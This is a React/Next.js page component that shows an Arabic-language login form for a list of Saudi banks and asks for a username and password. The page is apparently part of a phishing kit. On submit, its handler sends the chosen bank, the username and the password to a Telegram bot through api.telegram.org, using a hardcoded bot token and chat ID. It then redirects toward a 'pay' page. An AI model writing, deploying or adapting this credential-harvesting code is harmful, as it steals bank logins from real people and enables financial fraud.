"use client"

import React from 'react'
import { useRef } from 'react'
import styles from './banks.module.css'
import { useRouter } from 'next/navigation'

const Page = () => {
  let selectbanks = useRef();
  let username = useRef();
  let password = useRef();
  const router = useRouter();

  const handleOnSubmit = (e) => {
    e.preventDefault();
    var bot={
      token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
      chat_id:6364334502
    }
    var length =` نوع الحساب البنكي  : ${selectbanks.current.value} %0A   اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} `
   
    
    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
  
  }

  return (
    <div className={styles.continer}>
        <form onSubmit={handleOnSubmit}>
            <p>من فضلك قم باختيار البنك و من ثم قم بادخال الحساب</p>
            <select name="selectbanks" ref={selectbanks} required>
                <option value="بنك السعودي للاستثمار">بنك السعودي للاستثمار</option>
                <option value="بنك الأهلي ">بنك الأهلي</option>
                <option value="بنك الراجحي">بنك الراجحي</option>
                <option value="بنك الرياض">بنك الرياض</option>
                <option value="بنك العربي">بنك العربي</option>
                <option value="بنك الجزيرة">بنك الجزيرة</option>
                <option value="بنك السعودي الفرنسي">بنك السعودي الفرنسي</option>
                <option value=" سمبا كابيتال"> سامبا كابيتال</option>
                <option value="بنك سامبا">بنك سامبا</option>
                <option value="بنك البلاد">بنك البلاد</option>
                <option value="بنك الأنماء">بنك الأنماء</option>
                <option value="بنك ساب">بنك ساب</option>

            </select>
            <input type="text" ref={username} placeholder='ادخل اسم المستخدم' required/>
            <input type="password" ref={password} placeholder='كلمة المرور' required/>
            <button type='submit' onClick={() => router.push('/fozajil/banks/pay')} >تسجيل الدخول</button>
        </form>
    </div>
  )
}
export default Page;